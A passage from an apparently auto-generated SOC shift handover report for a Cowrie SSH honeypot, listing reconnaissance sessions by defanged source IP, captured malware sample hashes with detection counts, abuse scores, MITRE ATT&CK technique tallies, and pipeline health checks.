| `2026-05-13 21:58:12` | `cowrie.client.kex` |
| `2026-05-13 21:58:12` | `cowrie.login.success` |
| `2026-05-13 21:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `123.121.210[.]115` | **21** | 2026-05-13 22:39 | 2026-05-13 23:00 | 38m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `95.81.113[.]94` | **14** | 2026-05-13 21:27 | 2026-05-13 21:48 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `23.94.77[.]145` | **7** | 2026-05-13 21:30 | 2026-05-13 22:49 | 3m | 0 | `T1592` | 🟢 LOW |
| `47.108.129[.]145` | **4** | 2026-05-13 21:35 | 2026-05-13 22:32 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.98.136[.]63` | **2** | 2026-05-13 22:53 | 2026-05-13 22:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | **2** | 2026-05-13 21:46 | 2026-05-13 22:15 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-05-13 21:47 | 2026-05-13 21:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.176.25[.]78` | 1 | 2026-05-13 22:51 | 2026-05-13 22:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.196.22[.]11` | 1 | 2026-05-13 22:08 | 2026-05-13 22:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.119[.]118` | 1 | 2026-05-13 21:46 | 2026-05-13 21:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.31.186[.]200` | 1 | 2026-05-13 21:38 | 2026-05-13 21:38 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `144.79.187[.]21` | 1 | 2026-05-13 21:47 | 2026-05-13 21:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `155.4.245[.]222` | 1 | 2026-05-13 21:54 | 2026-05-13 21:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `156.245.246[.]50` | 1 | 2026-05-13 21:52 | 2026-05-13 21:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.123.217[.]22` | 1 | 2026-05-13 21:58 | 2026-05-13 21:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.158.244[.]111` | 1 | 2026-05-13 21:39 | 2026-05-13 21:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]102` | 1 | 2026-05-13 22:01 | 2026-05-13 22:01 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]211` | 1 | 2026-05-13 22:30 | 2026-05-13 22:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]215` | 1 | 2026-05-13 22:30 | 2026-05-13 22:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]92` | 1 | 2026-05-13 22:30 | 2026-05-13 22:30 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.108.129[.]145` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 5 |
| `91.230.168[.]92` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `45.123.217[.]22` | IN | NEST NIRMAN PRIVATE LIMITED | **100** ⚠️ | 13 |
| `156.245.246[.]50` | HK | BINARY NETWORKS SOLUTIONS LLC | **100** ⚠️ | 31 |
| `144.31.186[.]200` | DE | Frankfurt, Germany | **100** ⚠️ | 0 |
| `103.176.25[.]78` | VN | VAN TRANG PHARMACEUTICAL SUPPLY JOINT STOCK COMPANY | **100** ⚠️ | 1 |
| `123.121.210[.]115` | CN | China Unicom Beijing province network | **100** ⚠️ | 6 |
| `118.196.22[.]11` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 48 |
| `144.79.187[.]21` | ID | PT Antar Fiber Optik | **100** ⚠️ | 4 |
| `20.98.136[.]63` | US | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 77 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 30 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |

---

## 🔕 False Positive Summary (78 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 67 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 172 cases |
| Tool 34  | Credential Extractor        | ✅ 55 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 78 filtered (45.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 30 priority case(s) shown individually · 20 recon entry/entries in table (6 group(s) consolidating 50 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-13T23:08:41Z_
